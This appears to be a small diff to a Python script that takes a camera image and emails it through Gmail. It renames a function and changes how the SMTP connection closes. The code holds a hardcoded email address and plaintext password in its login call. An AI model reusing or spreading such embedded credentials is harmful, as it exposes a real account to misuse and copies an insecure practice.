@@ -9,7 +9,7 @@ from email.mime.image import MIMEImage
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 
-def email(Gmail):
+def mailer(Gmail):
 
 	img_data = open(Gmail, 'rb').read()
         msg = MIMEMultipart('mixed')
@@ -34,7 +34,7 @@ def email(Gmail):
         server.ehlo
         server.login('kurtax.h1@googlemail.com', 'kurtax%1')
         server.sendmail('kurtax.h1@googlemail.com','kurtax.h1@googlemail.com', msg.as_string())
-        server.quit()
+        server.close()
 
 #initialize the camer
 IMG = Camera()
